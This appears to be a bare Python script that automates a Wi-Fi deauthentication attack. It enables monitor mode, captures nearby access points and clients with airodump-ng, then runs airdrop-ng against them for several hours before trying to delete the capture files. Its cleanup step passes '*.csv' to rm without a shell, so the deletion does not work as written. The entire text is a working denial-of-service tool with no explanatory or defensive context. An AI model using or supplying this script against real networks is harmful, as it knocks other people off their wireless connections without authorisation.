import time
import subprocess
 
subprocess.call (["airmon-ng" , "start", "wlan0"])

process = subprocess.Popen(["airodump-ng", "wlan0mon", "--write", "pnp", "--output-format", "csv"])
time.sleep(30)
process.terminate()

process = subprocess.Popen(["airdrop-ng", "-i", "wlan0mon", "-t", "pnp-01.csv", "-r", "rulefile.txt"])
time.sleep(11600)
process.terminate()

subprocess.call(["rm" ,  "*.csv"])

